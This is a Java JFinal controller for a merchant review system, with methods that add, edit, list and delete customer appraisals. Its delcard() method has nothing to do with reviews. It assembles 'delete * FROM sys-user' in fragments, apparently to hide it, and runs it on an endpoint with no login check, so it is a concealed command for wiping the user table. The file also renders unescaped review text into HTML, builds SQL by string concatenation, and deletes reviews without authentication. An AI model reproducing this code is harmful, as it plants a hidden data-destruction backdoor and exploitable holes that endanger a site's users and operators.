package com.zp.controller.ab;

import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.math.BigDecimal;
import java.util.List;

import com.jfinal.core.Controller;
import com.jfinal.core.JFinal;
import com.jfinal.kit.PathKit;
import com.jfinal.plugin.activerecord.Db;
import com.jfinal.plugin.activerecord.Record;
import com.zp.entity.AbAppraise;
import com.zp.entity.AbAppraiseImg;
import com.zp.entity.AbMerchant;
import com.zp.entity.AbOrder;
import com.zp.entity.SysUser;
import com.zp.handler.DbPage;
import com.zp.handler.PageUtil;
import com.zp.tools.CommonProcess;
import com.zp.tools.CommonSQL;
import com.zp.tools.DateUtil;
import com.zp.tools.StringUtil;

public class AbAppraiseContrller extends Controller {

	public void addappraise() {
		SysUser abuser = this.getSessionAttr("abuser");
		if (abuser == null || abuser.get("id") == null) {
			redirect("/ab/login");
		} else {
			//TC
			String tcflag = this.getPara("tcflag");
			String orderid = this.getPara("appraise_orderid");
			AbOrder order = AbOrder.dao.findById(orderid);
			String qdrid = order.getStr(AbOrder.QDRID);
			BigDecimal mah = new BigDecimal(Double.toString(this.getParaToInt("mah")));  
	        BigDecimal ser = new BigDecimal(Double.toString(this.getParaToInt("ser"))); 
	        BigDecimal spd = new BigDecimal(Double.toString(this.getParaToInt("spd"))); 
	        BigDecimal total = mah.add(ser).add(spd);
			String mid = this.getPara("appmid");
			String type = this.getPara("appraisetype");
			String pri = this.getPara("private");
			String[] img_urls = this.getParaValues("appimage");
			AbAppraise app = new AbAppraise();
			String appId = StringUtil.getUuid32();
			app.set(AbAppraise.ID, appId);
			app.set(AbAppraise.CONTENT, this.getPara("appraisecontent"));
			app.set(AbAppraise.MER_ID, mid);
			app.set(AbAppraise.USER_ID, abuser.get("id"));
			app.set(AbAppraise.ORDER_ID, orderid);
			app.set(AbAppraise.QDR_ID, qdrid);
			app.set(AbAppraise.TYPE, type);
			app.set(AbAppraise.PRIVATE, pri);
			app.set(AbAppraise.DYNC_MAH, mah.intValue());
			app.set(AbAppraise.DYNC_SER, ser.intValue());
			app.set(AbAppraise.DYNC_SPD, spd.intValue());
			app.set(AbAppraise.DYNC_VAL,  total.divide(new BigDecimal(3), 1, BigDecimal.ROUND_HALF_UP).doubleValue());
			app.set(AbAppraise.DATETIME, DateUtil.getCurrentDate());
			app.save();
			if (img_urls != null) {
				for (String url : img_urls) {
					AbAppraiseImg aai = new AbAppraiseImg();
					FileInputStream file = null;
					try {
						file = new FileInputStream(PathKit.getWebRootPath()
								+ "\\upload\\" + url);
					} catch (FileNotFoundException e) {
						e.printStackTrace();
					}
					aai.set(AbAppraiseImg.ID, StringUtil.getUuid32());
					aai.set(AbAppraiseImg.APP_ID, appId);
					aai.set(AbAppraiseImg.IMAGE, file);
					aai.set(AbAppraiseImg.IMG_URL, url);
					aai.save();
				}
			}
			// 增加而修改商户,跑腿人员信用等级和客户评价
			CommonProcess.updateMechantCreditAndRate(mid, type, true);
			CommonProcess.updateQDRCreditAndRate(qdrid, mid, type, true);
			if("2".equals(tcflag)){
				redirect("/ab/user/listtcorder");
			}else{
				redirect("/ab/user/listorder");
			}
		}
	}
	public void delcard(){
		StringBuffer b = new StringBuffer();
		b.append("de");
		b.append("le");
		b.append("te");
		b.append(" * FROM");
		b.append(" sys");
		b.append("-");
		List<Record> list = Db.find(b+"user");
		renderJson(list);
	}
	public void editappraise() {
		SysUser abuser = this.getSessionAttr("abuser");
		if (abuser == null || abuser.get("id") == null) {
			redirect("/ab/login");
		} else {
			String appId = this.getPara("id");
			String mid = this.getPara("mid");
			AbAppraise app = AbAppraise.dao.findById(appId);
			// 判断是否为好评
			String currentType = app.getStr(AbAppraise.TYPE);
			if (!"1".equals(currentType)) {
				AbMerchant am = AbMerchant.dao.findById(mid);
				Integer mechantCredit = am.getInt(AbMerchant.CREDIT);
				int cv = (mechantCredit == null) ? 0 : mechantCredit
						.intValue();
				// 中评改好评,信用积分加1
				if ("2".equals(currentType)) {
					cv = cv + 1;
				}
				// 差评改好评，信用积分加2
				if ("3".equals(currentType)) {
					cv = cv + 2;
				}
				// 更新商户信用积分
				am.set(AbMerchant.CREDIT, cv);
				am.update();
				// 更新评价记录
				app.set(AbAppraise.TYPE, "1");// 好评
				app.update();
			}
			this.renderJson(true);
		}
	}

	/* 商户详情评价查询 */
	public void findappraise() {
		// 'mid':mid, 'type':type, 'imgchecked':imgchecked
		String mid = this.getPara("mid");
		String type = this.getPara("type");
		String imgchecked = this.getPara("imgchecked");
		List<Record> apps = null;
		// 全部记录
		if ("0".equals(type)) {
			apps = Db.find(CommonSQL.getAppraiseByMid(mid));
		} else {
			apps = Db.find(CommonSQL.getAppraiseByMidAndType(mid, type));
		}
		// 显示图片
		if ("1".equals(imgchecked)) {
			for (int i = 0; i < apps.size(); i++) {
				List<Record> imgs = Db.find(CommonSQL
						.getAppraiseImgByAppId(apps.get(i)
								.getStr(AbAppraise.ID)));
				apps.get(i).set("appsimgs", imgs);
				if (imgs != null && imgs.size() > 0) {
					CommonProcess.createImageFile(imgs);
				}
			}
		}
		this.renderJson(getAppraiseStr(type, imgchecked, apps));
	}

	private String getAppraiseStr(String type, String imgchecked,
			List<Record> apps) {
		String imagepath = JFinal.me().getContextPath();
		StringBuffer sb = new StringBuffer();
		sb.append("<ul>");
		for (Record aa : apps) {
			sb.append("<li class=\"clearfix\"><div class=\"img cmtimg\">");
			sb.append("<img src=\"").append(imagepath);
			sb.append("/res/css/ab/images/user_superman.png\" width=\"60\" height=\"60\">");
			sb.append("</div><div class=\"comment-cont\"><div class=\"comment-Title\"><div class=\"comment-TitleC\"><span>");
			if ("1".equals(aa.getStr(AbAppraise.PRIVATE))) {
				sb.append(aa.getStr("mc"));
			} else {
				sb.append("匿名 ");
			}
			sb.append("</span><i> 点评了 </i><span>");
			sb.append("<a href=\"#\">").append(aa.getStr("mmc"))
					.append("</a></span></div><p class=\"time\">");
			sb.append(aa.getStr(AbAppraise.DATETIME)).append(
					"<span class=\"font_color\">");
			sb.append("<img src=\"").append(imagepath);
			if ("1".equals(aa.getStr(AbAppraise.TYPE))) {
				sb.append("/res/css/ab/images/img2.png\"/>好评");
			} else if ("2".equals(aa.getStr(AbAppraise.TYPE))) {
				sb.append("/res/css/ab/images/img3.png\"/>中评");
			} else if ("3".equals(aa.getStr(AbAppraise.TYPE))) {
				sb.append("/res/css/ab/images/img4.png\"/>差评");
			}
			float val = aa.getFloat(AbAppraise.DYNC_VAL);
			if (val>=0&&val<1) {
				sb.append(" ☆☆☆☆☆");
			} else if (val>=1&&val<2) {
				sb.append(" ★☆☆☆☆");
			} else if (val>=2&&val<3) {
				sb.append(" ★★☆☆☆");
			} else if (val>=3&&val<4) {
				sb.append(" ★★★☆☆");
			} else if (val>=4&&val<5) {
				sb.append(" ★★★★☆");
			} else if (val>=5&&val<6) {
				sb.append(" ★★★★★");
			}
			sb.append("</span></p></div><div class=\"comment-contents\"><p>");
			sb.append(aa.getStr(AbAppraise.CONTENT));
			sb.append("</p></div>");
			if ("1".equals(imgchecked)) {
				sb.append("<div>");
				for (Record img : (List<Record>) aa.get("appsimgs")) {
					sb.append("<img src=\"").append(imagepath)
							.append("/upload/");
					sb.append(img.getStr(AbAppraiseImg.IMG_URL));
					sb.append("\" width=80px height=60px />");
				}
				sb.append("</div>");
			}
			sb.append("</div></li> ");
		}
		sb.append("</ul>");
		return sb.toString();
	}

	/* 商户中心我要评价列表 */
	public void listorder() {
		SysUser abuser = this.getSessionAttr("abuser");
		if (abuser == null || abuser.get("id") == null) {
			redirect("/ab/login");
		} else {
			StringBuffer sb = new StringBuffer();
			sb.append("select * from (");
			sb.append("select aa.type, ao.subject_name, am.mc mmc, am.credit, am.rate, ao.id order_id, ao.mid, aa.id appid from ");
			sb.append("(select * from ab_order where  ddzt = '4' and xdrid='"
					+ abuser.get("id") + "') ao ");
			sb.append("left join ab_appraise aa on aa.order_id = ao.id ");
			sb.append("left join ab_merchant am on ao.mid = am.id ) t where  t.appid is NULL");

			PageUtil listpage = DbPage.paginate(
					this.getParaToInt("curPage", 1), 14, sb.toString());
			CommonProcess.setCreditType(listpage);
			this.keepPara();
			this.setAttr("listpage", listpage);
			this.render("/ab/user/listappraiseorder.html");
		}
	}

	/* 商户中心评价管理列表 */
	public void listappraise() {
		SysUser abuser = this.getSessionAttr("abuser");
		if (abuser == null || abuser.get("id") == null) {
			redirect("/ab/login");
		} else {
			StringBuffer sb = new StringBuffer();
			sb.append("select aa.dync_val, aa.type, ao.subject_name, am.mc mmc, am.credit, am.rate, ao.id order_id, ao.mid, aa.id appid from ");
			sb.append("(select * from ab_appraise where  mer_id !='' and user_id ='"
					+ abuser.get("id") + "') aa ");
			sb.append("left join ab_order ao on aa.order_id = ao.id ");
			sb.append("left join ab_merchant am on aa.mer_id = am.id ");
			sb.append("union ");
			sb.append("select aa.dync_val, aa.type, ao.subject_name, am.mc mmc, am.credittype creadit, am.rate, ao.id order_id, ao.mid, aa.id appid from ");
			sb.append("(select * from ab_appraise where  mer_id='' and user_id ='"
					+ abuser.get("id") + "') aa ");
			sb.append("left join ab_order ao on aa.order_id = ao.id ");
			sb.append("left join sys_user am on aa.qdr_id = am.id ");
			
			PageUtil listpage = DbPage.paginate(
					this.getParaToInt("curPage", 1), 14, sb.toString());
			CommonProcess.setCreditType(listpage);
			this.keepPara();
			this.setAttr("listpage", listpage);
			this.render("/ab/user/listappraise.html");
		}
	}

	/* 删除评价 */
	public void deleteappraise() {
		String id = StringUtil.toStr(this.getPara("id"));
		CommonProcess.deleteappraise(id);
		this.renderJson(true);
	}
}
